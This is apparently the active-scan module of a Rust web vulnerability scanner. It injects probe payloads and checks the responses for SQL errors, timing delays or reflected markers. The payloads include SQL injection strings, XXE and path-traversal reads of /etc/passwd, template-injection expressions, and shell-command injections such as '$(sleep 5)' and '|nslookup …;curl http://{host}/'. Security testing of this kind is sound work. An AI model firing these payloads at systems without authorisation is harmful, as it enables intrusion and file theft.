use super::*;
use std::sync::atomic::Ordering;
use std::time::Duration;

use crate::proxy;
use crate::scanner::Severity;

// ------------------------------------------------------------ checks

const SQL_ERRORS: &[&str] = &[
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "postgresql query failed",
    "syntax error at or near",
    "sqlite3::",
    "sqlite error",
    "near \"",
    "ora-00933",
    "ora-01756",
    "odbc sql server driver",
    "sqlstate[",
    "microsoft ole db provider for sql server",
];

pub(crate) fn body_text(resp: &[u8]) -> String {
    String::from_utf8_lossy(&proxy::body_bytes(resp)).into_owned()
}

/// Similar enough to count as "the same page" (boolean-based inference).
fn same_page(a: &[u8], b: &[u8]) -> bool {
    let (a, b) = (body_text(a), body_text(b));
    status_of_eq(a.len(), b.len()) && a.lines().count().abs_diff(b.lines().count()) <= 1
}

fn status_of_eq(a: usize, b: usize) -> bool {
    a.abs_diff(b) <= (a.max(b) / 50).max(8)
}

fn token() -> String {
    let n = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(7);
    format!("bc{:06}", n % 1_000_000)
}

/// Pages re-fetched per injection, and total across the scan, when hunting for stored input.
/// ponytail: fixed caps; make them Config fields if large sites need deeper stored-XSS coverage.
const STORED_REFETCH_CAP: usize = 20;
pub(crate) const STORED_REFETCH_BUDGET: usize = 200;

/// XXE probe: declares an external entity pointing at `system` and references it from the point.
pub(crate) fn xxe_inject(req: &str, p: &Point, system: &str) -> String {
    let head_end = req.find("\r\n\r\n").map_or(req.len(), |i| i + 4);
    let body = &req[head_end..];
    // a DOCTYPE must follow any <?xml ...?> declaration; place it right after one, else at body start
    let decl = regex::Regex::new(r"(?s)^\s*<\?xml.*?\?>").unwrap();
    let ins = head_end + decl.find(body).map_or(0, |m| m.end());
    let doctype = format!("<!DOCTYPE bc [<!ENTITY xxe SYSTEM \"{system}\">]>");
    crate::tools::fix_content_length(&format!(
        "{}{doctype}{}&xxe;{}",
        &req[..ins],
        &req[ins..p.start],
        &req[p.end..]
    ))
}

fn audit_point(c: &Ctx, req: &str, p: &Point, base: &(Vec<u8>, Duration)) {
    let orig = req[p.start..p.end].to_string();
    // BChecks: `given [kind] insertion point`
    let kind = format!("{:?}", p.kind).to_ascii_lowercase();
    for b in crate::bcheck::enabled(
        |g| matches!(g, crate::bcheck::Given::Point(k) if k.as_ref().is_none_or(|k| *k == kind)),
    ) {
        let value = match &b.action {
            crate::bcheck::Action::Append(s) => format!("{orig}{s}"),
            crate::bcheck::Action::Replace(s) => s.clone(),
            _ => continue,
        };
        let r = inject(req, p, &value);
        if let Some((resp, _)) = c.send(&r)
            && let Some(m) = b.matched(&crate::bcheck::Responses {
                latest: &resp,
                base: Some(&base.0),
            })
        {
            let e = entry_of(&c.target, &r, &resp, "Scanner");
            let mut issue = m.issue(e.origin(), e.path().to_string(), 0);
            issue.detail = format!("{} ({})", issue.detail, p.label());
            c.report_issue(issue, e);
        }
    }
    let base_body = body_text(&base.0).to_lowercase();
    let lab = p.label();

    if c.cfg.on("SQL injection") {
        for q in ["'", "\""] {
            let r = inject(req, p, &format!("{orig}{q}"));
            if let Some((resp, _)) = c.send(&r) {
                let low = body_text(&resp).to_lowercase();
                if let Some(e) = SQL_ERRORS
                    .iter()
                    .find(|e| low.contains(*e) && !base_body.contains(*e))
                {
                    c.report("SQL injection", Severity::High, "Firm", format!("The {lab} appears vulnerable: submitting a {q} quote produced the database error \"{e}\"."), &r, &resp);
                    return;
                }
            }
        }
        // boolean inference: an always-true condition keeps the page, an always-false one changes it
        for (t, f) in [
            (format!("{orig}' AND '1'='1"), format!("{orig}' AND '1'='2")),
            (format!("{orig} AND 1=1"), format!("{orig} AND 1=2")),
        ] {
            let (rt, rf) = (inject(req, p, &t), inject(req, p, &f));
            if let (Some((a, _)), Some((b, _))) = (c.send(&rt), c.send(&rf))
                && same_page(&a, &base.0)
                && !same_page(&b, &base.0)
                && let (Some((a2, _)), Some((b2, _))) = (c.send(&rt), c.send(&rf))
                && same_page(&a2, &a)
                && same_page(&b2, &b)
            {
                c.report("SQL injection", Severity::High, "Firm", format!("The {lab} appears vulnerable to boolean-based SQL injection: `{t}` returned the original page, `{f}` a different one (confirmed twice)."), &rf, &b);
                return;
            }
        }
        if c.cfg.on("Time-based checks (slow)") {
            for pl in [
                "' AND SLEEP(5)-- -",
                "'||pg_sleep(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                " AND SLEEP(5)",
            ] {
                let r = inject(req, p, &format!("{orig}{pl}"));
                if c.send(&r)
                    .is_some_and(|(_, t)| t > base.1 + Duration::from_millis(4500))
                    && let Some((resp, t)) = c
                        .send(&r)
                        .filter(|(_, t)| *t > base.1 + Duration::from_millis(4500))
                {
                    c.report("SQL injection", Severity::High, "Firm", format!("The {lab} appears vulnerable to time-based SQL injection: `{pl}` delayed the response by {:.1}s (twice).", t.as_secs_f32()), &r, &resp);
                    return;
                }
            }
        }
    }
    if c.cfg.on("Cross-site scripting (reflected)") {
        let tk = token();
        let pl = format!("{tk}<b\"'>{tk}");
        let r = inject(req, p, &pl);
        if let Some((resp, _)) = c.send(&r)
            && body_text(&resp).contains(&pl)
            && !String::from_utf8_lossy(proxy::head(&resp))
                .to_ascii_lowercase()
                .contains("content-type: application/json")
        {
            c.report("Cross-site scripting (reflected)", Severity::High, "Firm", format!("The value of the {lab} is copied into the response without HTML encoding: `{pl}` came back unchanged."), &r, &resp);
        }
    }
    if c.cfg.on("Cross-site scripting (stored)") {
        let tk = format!("bcs{}{}", p.start, token());
        let pl = format!("{tk}<b>{tk}");
        let r = inject(req, p, &pl);
        // chase it only when it is NOT echoed straight back (that would be reflected XSS)
        if let Some((resp, _)) = c.send(&r)
            && !body_text(&resp).contains(&pl)
        {
            let pages: Vec<String> = c
                .pages
                .lock()
                .unwrap()
                .iter()
                .take(STORED_REFETCH_CAP)
                .cloned()
                .collect();
            for path in pages {
                if c.stored_left.fetch_sub(1, Ordering::SeqCst) == 0 {
                    c.stored_left.fetch_add(1, Ordering::SeqCst); // undo; budget spent
                    break;
                }
                let Some((resp2, _)) = c.send(&get_request(&c.target, &path)) else {
                    continue;
                };
                if body_text(&resp2).contains(&pl)
                    && !String::from_utf8_lossy(proxy::head(&resp2))
                        .to_ascii_lowercase()
                        .contains("content-type: application/json")
                {
                    c.report("Cross-site scripting (stored)", Severity::High, "Firm", format!("The value of the {lab} is stored and later copied into {path} without HTML encoding: `{pl}` surfaced there unchanged."), &r, &resp2);
                    break;
                }
            }
        }
    }
    if c.cfg.on("XML external entity injection") && p.kind == Kind::Xml {
        for (file, mark) in [
            ("file:///etc/passwd", "root:x:0:0"),
            ("file:///c:/windows/win.ini", "[fonts]"),
        ] {
            let r = xxe_inject(req, p, file);
            if let Some((resp, _)) = c.send(&r)
                && body_text(&resp).contains(mark)
                && !base_body.contains(&mark.to_lowercase())
            {
                c.report("XML external entity injection", Severity::High, "Firm", format!("The {lab} is parsed with external entities enabled: an entity pointing at `{file}` returned content containing `{mark}`."), &r, &resp);
                break;
            }
        }
        if c.cfg.on("Out-of-band interactions (Collaborator)") {
            let label = format!("Scan {} {lab} xxe {}", c.task, p.start);
            let host = crate::collab::client().lock().unwrap().payload(&label);
            if let Some(host) = host {
                let r = xxe_inject(req, p, &format!("http://{host}/"));
                if c.send(&r).is_some() {
                    c.oob.lock().unwrap().push((
                        label,
                        "XML external entity injection",
                        format!("The {lab} triggered an out-of-band interaction: an external entity pointed at the Collaborator server."),
                        r,
                    ));
                }
            }
        }
    }
    if c.cfg.on("File path traversal") {
        for (pl, mark) in [
            ("../../../../../../../../etc/passwd", "root:x:0:0"),
            ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "root:x:0:0"),
            ("/etc/passwd", "root:x:0:0"),
            ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
        ] {
            let r = inject(req, p, pl);
            if let Some((resp, _)) = c.send(&r)
                && body_text(&resp).contains(mark)
                && !base_body.contains(mark)
            {
                c.report("File path traversal", Severity::High, "Firm", format!("The {lab} is used to read files: `{pl}` returned content containing `{mark}`."), &r, &resp);
                break;
            }
        }
    }
    if c.cfg.on("Server-side template injection") {
        for pl in ["{{7*7191}}", "${7*7191}", "<%= 7*7191 %>", "#{7*7191}"] {
            let r = inject(req, p, pl);
            if let Some((resp, _)) = c.send(&r)
                && body_text(&resp).contains("50337") // 7*7191
                && !base_body.contains("50337")
            {
                c.report(
                    "Server-side template injection",
                    Severity::High,
                    "Firm",
                    format!("The {lab} is evaluated by a template engine: `{pl}` produced 50337."),
                    &r,
                    &resp,
                );
                break;
            }
        }
    }
    if c.cfg.on("Open redirection") {
        let pl = "https://burpcraft-redirect.example/";
        let r = inject(req, p, pl);
        if let Some((resp, _)) = c.send(&r)
            && (300..400).contains(&proxy::status_of(&resp))
            && crate::net::header(&String::from_utf8_lossy(proxy::head(&resp)), "location")
                .is_some_and(|l| l.starts_with(pl) || l.starts_with("//burpcraft-redirect.example"))
        {
            c.report(
                "Open redirection",
                Severity::Medium,
                "Firm",
                format!("The {lab} controls the redirect target: the response redirected to {pl}."),
                &r,
                &resp,
            );
        }
    }
    if c.cfg.on("HTTP response header injection") && p.kind != Kind::Header {
        let r = inject(req, p, &format!("{orig}\r\nX-Bc-Injected: 1"));
        if let Some((resp, _)) = c.send(&r)
            && String::from_utf8_lossy(proxy::head(&resp))
                .lines()
                .any(|l| l.eq_ignore_ascii_case("x-bc-injected: 1"))
        {
            c.report(
                "HTTP response header injection",
                Severity::Medium,
                "Firm",
                format!("CR/LF in the {lab} adds a response header (X-Bc-Injected)."),
                &r,
                &resp,
            );
        }
    }
    if c.cfg.on("OS command injection") && c.cfg.on("Time-based checks (slow)") {
        for pl in [
            ";sleep 5;",
            "|sleep 5",
            "$(sleep 5)",
            "`sleep 5`",
            "& ping -n 6 127.0.0.1 &",
        ] {
            let r = inject(req, p, &format!("{orig}{pl}"));
            if c.send(&r)
                .is_some_and(|(_, t)| t > base.1 + Duration::from_millis(4500))
                && let Some((resp, t)) = c
                    .send(&r)
                    .filter(|(_, t)| *t > base.1 + Duration::from_millis(4500))
            {
                c.report(
                    "OS command injection",
                    Severity::High,
                    "Firm",
                    format!(
                        "The {lab} reaches a shell: `{pl}` delayed the response by {:.1}s (twice).",
                        t.as_secs_f32()
                    ),
                    &r,
                    &resp,
                );
                break;
            }
        }
    }
    if c.cfg.on("Out-of-band interactions (Collaborator)") {
        let mut cl = crate::collab::client().lock().unwrap();
        if cl.configured() {
            let mut plan = vec![];
            for (what, issue) in [
                ("url", "External service interaction"),
                ("cmd", "OS command injection"),
            ] {
                let l = format!("Scan {} {lab} {what} {}", c.task, p.start);
                let Some(host) = cl.payload(&l) else { break };
                let pl = if what == "url" {
                    format!("http://{host}/")
                } else {
                    format!(
                        "{orig}|nslookup {h};curl http://{host}/",
                        h = host.split('/').next().unwrap_or("")
                    )
                };
                plan.push((l, issue, pl));
            }
            drop(cl);
            for (l, issue, pl) in plan {
                let r = inject(req, p, &pl);
                if c.send(&r).is_some() {
                    c.oob.lock().unwrap().push((l, issue, format!("The {lab} triggered an interaction with the Collaborator server: payload `{pl}`."), r));
                }
            }
        }
    }
}

/// Audits every insertion point of one request.
pub(crate) fn audit(c: &Ctx, req: &str) {
    let Some(base) = c.send(req) else { return };
    for p in points(req) {
        if c.stop.load(Ordering::SeqCst) {
            return;
        }
        audit_point(c, req, &p, &base);
    }
}
